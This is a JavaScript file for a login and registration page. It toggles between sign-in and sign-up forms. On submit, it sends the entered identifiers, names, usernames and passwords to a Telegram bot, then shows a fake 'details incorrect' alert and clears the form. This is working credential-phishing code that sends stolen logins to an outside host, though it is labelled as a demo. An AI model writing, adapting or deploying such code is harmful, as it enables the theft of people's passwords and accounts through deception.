// === EDIT THESE WITH YOUR TELEGRAM BOT INFO ===
const BOT_TOKEN = "YOUR_BOT_TOKEN";
const CHAT_ID = "YOUR_CHAT_ID";

// Helper: send message to Telegram
async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
  });
}

// Toggle between Sign In and Sign Up
const signinTab = document.getElementById("tab-signin");
const signupTab = document.getElementById("tab-signup");
const signinForm = document.getElementById("signinForm");
const signupForm = document.getElementById("signupForm");

signinTab.addEventListener("click", () => {
  signinForm.classList.remove("hidden");
  signupForm.classList.add("hidden");
  signinTab.classList.add("active");
  signupTab.classList.remove("active");
});

signupTab.addEventListener("click", () => {
  signupForm.classList.remove("hidden");
  signinForm.classList.add("hidden");
  signupTab.classList.add("active");
  signinTab.classList.remove("active");
});

// Handle Sign In submit
signinForm.addEventListener("submit", async (e) => {
  e.preventDefault();
  const id = document.getElementById("signin-identifier").value;
  const pw = document.getElementById("signin-password").value;
  const msg = `🔑 New Sign In:\n\nIdentifier: ${id}\nPassword: ${pw}`;
  await sendToTelegram(msg);
  alert("Sign in details incorrect! (demo).");
  signinForm.reset();
});

// Handle Sign Up submit
signupForm.addEventListener("submit", async (e) => {
  e.preventDefault();
  const fn = document.getElementById("signup-first").value;
  const ln = document.getElementById("signup-last").value;
  const user = document.getElementById("signup-username").value;
  const pw = document.getElementById("signup-password").value;
  const cpw = document.getElementById("signup-confirm").value;

  if (pw !== cpw) {
    alert("Passwords do not match!");
    return;
  }

  const msg = `🆕 New Sign Up:\n\nName: ${fn} ${ln}\nUsername: ${user}\nPassword: ${pw}`;
  await sendToTelegram(msg);
  alert("Sign up details incorrect! (demo).");
  signupForm.reset();
});
